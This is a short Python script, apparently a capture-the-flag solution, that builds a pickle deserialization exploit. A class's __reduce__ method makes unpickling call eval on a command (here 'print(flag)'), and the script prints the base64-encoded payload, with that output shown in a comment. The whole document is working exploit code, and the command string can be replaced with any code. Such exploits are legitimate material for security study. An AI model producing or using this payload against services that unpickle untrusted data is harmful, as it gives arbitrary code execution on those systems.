#!/usr/bin/env python3


import pickle
import base64

CMD = 'print(flag)'

class RunCmd(object):
    def __reduce__(self):
        return(__builtins__.eval, (CMD,))


print(base64.b64encode(pickle.dumps(RunCmd())))
# Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMncHJpbnQoZmxhZyknCnAxCnRwMgpScDMKLg==